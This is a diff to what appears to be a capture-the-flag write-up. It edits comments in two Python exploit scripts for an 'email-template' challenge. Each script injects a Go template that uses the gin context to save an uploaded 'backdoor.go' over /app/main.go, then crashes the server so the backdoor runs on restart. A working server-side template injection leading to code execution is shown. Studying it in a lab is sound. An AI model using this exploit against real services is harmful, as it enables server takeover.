@@ -652,7 +652,6 @@ r.GET("/", func(c *gin.Context) {
 import requests
 
 URL = "http://dev-7fe5c15819a3af65.email-template.ctf"
-
 payload = {
     "template": """
 {{ .c.SaveUploadedFile (.c.FormFile "fish") "/app/main.go" }}
@@ -661,15 +660,18 @@ payload = {
 
 files = {'fish': open("backdoor.go", "r")}
 
-r = requests.post(URL+"/update", json=payload) # Updates the preview template.
+# Updates the preview template.
+r = requests.post(URL+"/update", json=payload)
 print(r.status_code)
 print(r.text)
 
-r = requests.post(URL+"/preview?", files=files) # Trigger the rendering of our template.
+# Triggers the rendering of our template with the provided form file
+r = requests.post(URL+"/preview?", files=files)
 print(r.status_code)
 print(r.text)
 
-r = requests.post(URL+"/update") # Crashes server, which restarts the service.
+# Crashes server, which restarts the service.
+r = requests.post(URL+"/update")
 print(r.status_code)
 print(r.text)
 
@@ -953,7 +955,6 @@ After a bit of research, it turns out that a `*multipart.FileHeader` contains an
 import requests
 
 URL = "http://dev-092f50226ea22197.email-template.ctf"
-
 payload = {
     "template": """
 {{ with .c.FormFile .customA }}
@@ -966,11 +967,18 @@ payload = {
 # Filename: /app/main.go
 files = {'fish': ("/app/main.go", open("backdoor.go","r"))}
 
+# Updates the preview template.
 r = requests.post(URL+"/update", json=payload)
 print(r.status_code)
 print(r.text)
 
+# Defines all the required custom variables and triggers the rendering of our template with the provided form file
 r = requests.post(URL+"/preview?custom1=a&custom2=a&custom3=a&custom4=a&custom5=a&custom6=a&custom7=a&custom8=a&custom9=a&custom%3A=a&custom%3B=a&custom%3C=a&custom%3D=a&custom%3E=a&custom%3F=a&custom%40=a&customA=fish", files=files)
+print(r.status_code)
+print(r.text)
+
+# Crashes server, which restarts the service.
+r = requests.post(URL+"/update")
 print(r.status_code)
 print(r.text)
 ```
